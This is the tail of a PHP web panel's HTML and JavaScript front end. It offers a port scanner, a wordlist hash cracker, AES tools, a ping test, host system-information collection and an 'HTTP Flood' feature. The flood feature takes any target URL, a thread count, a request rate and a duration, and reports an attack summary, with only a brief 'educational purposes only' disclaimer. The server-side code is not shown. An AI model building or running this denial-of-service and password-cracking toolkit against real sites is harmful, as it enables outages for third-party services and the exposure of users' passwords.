                                <option value="sha256">SHA256</option>
                            </select>
                        </div>
                        <button class="btn btn-primary" onclick="runHashCrack()">
                            <i class="fas fa-play"></i> Crack Hash
                        </button>
                        <div id="hash-crack-results" class="results-container" style="display: none; margin-top: 20px;"></div>
                    `;
                    break;
                    
                case 'http_flood':
                    toolTitle = '<i class="fas fa-bolt"></i> HTTP Flood';
                    toolContent = `
                        <div class="alert alert-warning">
                            <i class="fas fa-exclamation-triangle"></i> For educational purposes only. Use only on systems you own.
                        </div>
                        <div class="form-group">
                            <label class="form-label">Target URL</label>
                            <input type="text" id="flood-url" class="form-control" placeholder="http://example.com">
                        </div>
                        <div class="form-group">
                            <label class="form-label">Threads</label>
                            <input type="number" id="flood-threads" class="form-control" value="10" min="1" max="100">
                        </div>
                        <div class="form-group">
                            <label class="form-label">Duration (seconds)</label>
                            <input type="number" id="flood-duration" class="form-control" value="30" min="1" max="300">
                        </div>
                        <div class="form-group">
                            <label class="form-label">Requests per Second</label>
                            <input type="number" id="flood-rps" class="form-control" value="100" min="1" max="1000">
                        </div>
                        <button class="btn btn-danger" onclick="runHttpFlood()">
                            <i class="fas fa-bomb"></i> Start Flood
                        </button>
                        <div id="flood-results" class="results-container" style="display: none; margin-top: 20px;"></div>
                    `;
                    break;
                    
                case 'encryption_tool':
                    toolTitle = '<i class="fas fa-lock"></i> AES Encryption';
                    toolContent = `
                        <div class="form-group">
                            <label class="form-label">Data to Encrypt</label>
                            <textarea id="encrypt-data" class="form-control" rows="5" placeholder="Enter text to encrypt"></textarea>
                        </div>
                        <div class="form-group">
                            <label class="form-label">Encryption Key (optional)</label>
                            <input type="text" id="encrypt-key" class="form-control" placeholder="Leave empty for random key">
                        </div>
                        <button class="btn btn-primary" onclick="runEncrypt()">
                            <i class="fas fa-lock"></i> Encrypt
                        </button>
                        <div id="encrypt-results" class="results-container" style="display: none; margin-top: 20px;"></div>
                    `;
                    break;
                    
                case 'decryption_tool':
                    toolTitle = '<i class="fas fa-unlock"></i> AES Decryption';
                    toolContent = `
                        <div class="form-group">
                            <label class="form-label">Encrypted Data</label>
                            <textarea id="decrypt-data" class="form-control" rows="5" placeholder="Enter encrypted text"></textarea>
                        </div>
                        <div class="form-group">
                            <label class="form-label">Encryption Key</label>
                            <input type="text" id="decrypt-key" class="form-control" placeholder="Enter encryption key">
                        </div>
                        <div class="form-group">
                            <label class="form-label">IV (Initialization Vector)</label>
                            <input type="text" id="decrypt-iv" class="form-control" placeholder="Enter IV from encryption">
                        </div>
                        <button class="btn btn-primary" onclick="runDecrypt()">
                            <i class="fas fa-unlock"></i> Decrypt
                        </button>
                        <div id="decrypt-results" class="results-container" style="display: none; margin-top: 20px;"></div>
                    `;
                    break;
                    
                case 'ping_tool':
                    toolTitle = '<i class="fas fa-wifi"></i> Ping Test';
                    toolContent = `
                        <div class="form-group">
                            <label class="form-label">Target Host</label>
                            <input type="text" id="ping-target" class="form-control" value="google.com" placeholder="IP or hostname">
                        </div>
                        <div class="form-group">
                            <label class="form-label">Count</label>
                            <input type="number" id="ping-count" class="form-control" value="4" min="1" max="20">
                        </div>
                        <button class="btn btn-primary" onclick="runPingTest()">
                            <i class="fas fa-play"></i> Start Ping
                        </button>
                        <div id="ping-results" class="results-container" style="display: none; margin-top: 20px;"></div>
                    `;
                    break;
            }
            
            title.innerHTML = toolTitle;
            content.innerHTML = toolContent;
            showModal('tool-modal');
        }
        
        // Run port scan
        function runPortScan() {
            const target = document.getElementById('scan-target').value;
            const ports = document.getElementById('scan-ports').value;
            const timeout = document.getElementById('scan-timeout').value;
            
            fetch('', {
                method: 'POST',
                headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
                body: 'action=port_scan&target=' + encodeURIComponent(target) + 
                      '&ports=' + encodeURIComponent(ports) + 
                      '&timeout=' + encodeURIComponent(timeout)
            })
            .then(response => response.json())
            .then(data => {
                const resultsDiv = document.getElementById('port-scan-results');
                let html = `<h4>Scan Results for ${data.target}</h4>`;
                
                if (data.success) {
                    html += `<p>Scanned ${data.total_scanned} ports, found ${data.open_count} open</p>`;
                    
                    if (data.results && data.results.length > 0) {
                        html += '<div style="max-height: 300px; overflow-y: auto;">';
                        data.results.forEach(result => {
                            if (result.status === 'OPEN') {
                                html += `
                                    <div class="result-item">
                                        <strong>Port ${result.port}</strong> - ${result.status} (${result.service})
                                    </div>
                                `;
                            }
                        });
                        html += '</div>';
                    }
                } else {
                    html += `<div class="result-item error">${data.error || 'Scan failed'}</div>`;
                }
                
                resultsDiv.innerHTML = html;
                resultsDiv.style.display = 'block';
            });
        }
        
        // Run hash crack
        function runHashCrack() {
            const hash = document.getElementById('hash-input').value;
            const algorithm = document.getElementById('hash-algorithm').value;
            
            if (!hash) {
                showAlert('Please enter a hash', 'error');
                return;
            }
            
            fetch('', {
                method: 'POST',
                headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
                body: 'action=hash_crack&hash=' + encodeURIComponent(hash) + 
                      '&algorithm=' + encodeURIComponent(algorithm)
            })
            .then(response => response.json())
            .then(data => {
                const resultsDiv = document.getElementById('hash-crack-results');
                let html = `<h4>Hash Cracking Results</h4>`;
                
                if (data.success) {
                    if (data.found) {
                        html += `
                            <div class="result-item">
                                <strong>✓ HASH CRACKED SUCCESSFULLY</strong><br>
                                Hash: ${data.hash}<br>
                                Algorithm: ${data.algorithm}<br>
                                Plaintext: <strong>${data.plaintext}</strong><br>
                                Attempts: ${data.attempts}
                            </div>
                        `;
                    } else {
                        html += `
                            <div class="result-item warning">
                                <strong>✗ HASH NOT CRACKED</strong><br>
                                Hash: ${data.hash}<br>
                                Algorithm: ${data.algorithm}<br>
                                Attempts: ${data.attempts}<br>
                                <em>Try with a larger wordlist</em>
                            </div>
                        `;
                    }
                } else {
                    html += `<div class="result-item error">${data.error || 'Cracking failed'}</div>`;
                }
                
                resultsDiv.innerHTML = html;
                resultsDiv.style.display = 'block';
            });
        }
        
        // Run HTTP flood
        function runHttpFlood() {
            const url = document.getElementById('flood-url').value;
            const threads = document.getElementById('flood-threads').value;
            const duration = document.getElementById('flood-duration').value;
            const rps = document.getElementById('flood-rps').value;
            
            if (!url) {
                showAlert('Please enter a target URL', 'error');
                return;
            }
            
            if (!confirm('Start HTTP flood attack? Use only on systems you own!')) {
                return;
            }
            
            fetch('', {
                method: 'POST',
                headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
                body: 'action=http_flood&url=' + encodeURIComponent(url) + 
                      '&threads=' + encodeURIComponent(threads) + 
                      '&duration=' + encodeURIComponent(duration) + 
                      '&requests_per_second=' + encodeURIComponent(rps)
            })
            .then(response => response.json())
            .then(data => {
                const resultsDiv = document.getElementById('flood-results');
                let html = `<h4>HTTP Flood Results</h4>`;
                
                if (data.success) {
                    html += `
                        <div class="stats-grid">
                            <div class="stat-card">
                                <div class="stat-value">${data.total_requests}</div>
                                <div class="stat-label">Total Requests</div>
                            </div>
                            <div class="stat-card">
                                <div class="stat-value">${data.successful_requests}</div>
                                <div class="stat-label">Successful</div>
                            </div>
                            <div class="stat-card">
                                <div class="stat-value">${data.failed_requests}</div>
                                <div class="stat-label">Failed</div>
                            </div>
                            <div class="stat-card">
                                <div class="stat-value">${data.duration}s</div>
                                <div class="stat-label">Duration</div>
                            </div>
                        </div>
                        <div class="result-item">
                            <strong>Attack Summary</strong><br>
                            Target: ${data.url}<br>
                            Threads: ${data.threads}<br>
                            Requests/sec: ${data.requests_per_second}<br>
                            Duration: ${data.duration} seconds<br>
                            Note: ${data.note || ''}
                        </div>
                    `;
                } else {
                    html += `<div class="result-item error">${data.error || 'Attack failed'}</div>`;
                }
                
                resultsDiv.innerHTML = html;
                resultsDiv.style.display = 'block';
            });
        }
        
        // Run encryption
        function runEncrypt() {
            const data = document.getElementById('encrypt-data').value;
            const key = document.getElementById('encrypt-key').value || bin2hex(crypto.getRandomValues(new Uint8Array(16)));
            
            if (!data) {
                showAlert('Please enter data to encrypt', 'error');
                return;
            }
            
            fetch('', {
                method: 'POST',
                headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
                body: 'action=encrypt_aes&data=' + encodeURIComponent(data) + 
                      '&key=' + encodeURIComponent(key)
            })
            .then(response => response.json())
            .then(result => {
                const resultsDiv = document.getElementById('encrypt-results');
                let html = `<h4>AES Encryption Results</h4>`;
                
                if (result.success) {
                    html += `
                        <div class="result-item">
                            <strong>✓ ENCRYPTION SUCCESSFUL</strong><br>
                            Algorithm: ${result.algorithm}<br>
                            Encrypted: <code style="word-break: break-all;">${result.encrypted}</code><br>
                            Key: <code>${result.key}</code><br>
                            IV: <code>${result.iv}</code><br><br>
                            <strong>Save both Key and IV for decryption!</strong>
                        </div>
                    `;
                } else {
                    html += `<div class="result-item error">${result.error || 'Encryption failed'}</div>`;
                }
                
                resultsDiv.innerHTML = html;
                resultsDiv.style.display = 'block';
            });
        }
        
        // Run decryption
        function runDecrypt() {
            const encrypted = document.getElementById('decrypt-data').value;
            const key = document.getElementById('decrypt-key').value;
            const iv = document.getElementById('decrypt-iv').value;
            
            if (!encrypted || !key || !iv) {
                showAlert('Please fill all fields', 'error');
                return;
            }
            
            fetch('', {
                method: 'POST',
                headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
                body: 'action=decrypt_aes&encrypted=' + encodeURIComponent(encrypted) + 
                      '&key=' + encodeURIComponent(key) + 
                      '&iv=' + encodeURIComponent(iv)
            })
            .then(response => response.json())
            .then(result => {
                const resultsDiv = document.getElementById('decrypt-results');
                let html = `<h4>AES Decryption Results</h4>`;
                
                if (result.success) {
                    html += `
                        <div class="result-item">
                            <strong>✓ DECRYPTION SUCCESSFUL</strong><br>
                            Decrypted: <code>${result.decrypted}</code>
                        </div>
                    `;
                } else {
                    html += `<div class="result-item error">Decryption failed - wrong key or IV</div>`;
                }
                
                resultsDiv.innerHTML = html;
                resultsDiv.style.display = 'block';
            });
        }
        
        // Run ping test
        function runPingTest() {
            const target = document.getElementById('ping-target').value;
            const count = document.getElementById('ping-count').value;
            
            if (!target) {
                showAlert('Please enter a target', 'error');
                return;
            }
            
            fetch('', {
                method: 'POST',
                headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
                body: 'action=ping_test&target=' + encodeURIComponent(target) + 
                      '&count=' + encodeURIComponent(count)
            })
            .then(response => response.json())
            .then(data => {
                const resultsDiv = document.getElementById('ping-results');
                let html = `<h4>Ping Results for ${data.target}</h4>`;
                
                if (data.success) {
                    html += `
                        <div class="result-item">
                            <strong>✓ PING SUCCESSFUL</strong><br>
                            <pre>${data.output}</pre>
                        </div>
                    `;
                } else {
                    html += `
                        <div class="result-item error">
                            <strong>✗ PING FAILED</strong><br>
                            <pre>${data.output}</pre>
                        </div>
                    `;
                }
                
                resultsDiv.innerHTML = html;
                resultsDiv.style.display = 'block';
            });
        }
        
        // Get system info
        function getSystemInfo() {
            fetch('', {
                method: 'POST',
                headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
                body: 'action=system_info'
            })
            .then(response => response.json())
            .then(data => {
                const resultsDiv = document.getElementById('system-info-output');
                const container = document.getElementById('system-info-results');
                
                let html = `<div class="stats-grid">`;
                
                if (data.cpu_cores) {
                    html += `
                        <div class="stat-card">
                            <div class="stat-value">${data.cpu_cores}</div>
                            <div class="stat-label">CPU Cores</div>
                        </div>
                    `;
                }
                
                if (data.memory_total) {
                    const totalGB = (data.memory_total / 1024 / 1024).toFixed(2);
                    html += `
                        <div class="stat-card">
                            <div class="stat-value">${totalGB}GB</div>
                            <div class="stat-label">Total RAM</div>
                        </div>
                        <div class="stat-card">
                            <div class="stat-value">${data.memory_usage_percent || 0}%</div>
                            <div class="stat-label">RAM Used</div>
                        </div>
                    `;
                }
                
                if (data.disk_total) {
                    const totalGB = (data.disk_total / 1024 / 1024 / 1024).toFixed(2);
                    html += `
                        <div class="stat-card">
                            <div class="stat-value">${totalGB}GB</div>
                            <div class="stat-label">Total Disk</div>
                        </div>
                        <div class="stat-card">
                            <div class="stat-value">${data.disk_usage_percent || 0}%</div>
                            <div class="stat-label">Disk Used</div>
                        </div>
                    `;
                }
                
                if (data.load_average) {
                    html += `
                        <div class="stat-card">
                            <div class="stat-value">${data.load_average}</div>
                            <div class="stat-label">Load Avg</div>
                        </div>
                    `;
                }
                
                if (data.uptime_days !== undefined) {
                    html += `
                        <div class="stat-card">
                            <div class="stat-value">${data.uptime_days}d</div>
                            <div class="stat-label">Uptime</div>
                        </div>
                    `;
                }
                
                if (data.processes) {
                    html += `
                        <div class="stat-card">
                            <div class="stat-value">${data.processes}</div>
                            <div class="stat-label">Processes</div>
                        </div>
                    `;
                }
                
                html += `</div>`;
                
                // Detailed info
                html += `<div class="result-item" style="margin-top: 20px;">`;
                html += `<strong>Detailed System Information</strong><br>`;
                
                if (data.cpu) {
                    html += `CPU: ${data.cpu}<br>`;
                }
                
                if (data.uptime_days !== undefined) {
                    html += `Uptime: ${data.uptime_days || 0} days, ${data.uptime_hours || 0} hours, ${data.uptime_minutes || 0} minutes<br>`;
                }
                
                html += `</div>`;
                
                resultsDiv.innerHTML = html;
                container.style.display = 'block';
            });
        }
        
        // Modal functions
        function showModal(modalId) {
            document.getElementById(modalId).classList.add('active');
        }
        
        function hideModal(modalId) {
            document.getElementById(modalId).classList.remove('active');
        }
        
        // Global event listeners
        document.addEventListener('keydown', (e) => {
            if (e.key === 'Escape') {
                document.querySelectorAll('.modal.active').forEach(modal => {
                    modal.classList.remove('active');
                });
            }
        });
        
        // Utility function for generating random hex
        function bin2hex(buffer) {
            return Array.from(new Uint8Array(buffer))
                .map(b => b.toString(16).padStart(2, '0'))
                .join('');
        }
    </script>
</body>
</html>
<?php ob_end_flush(); ?>
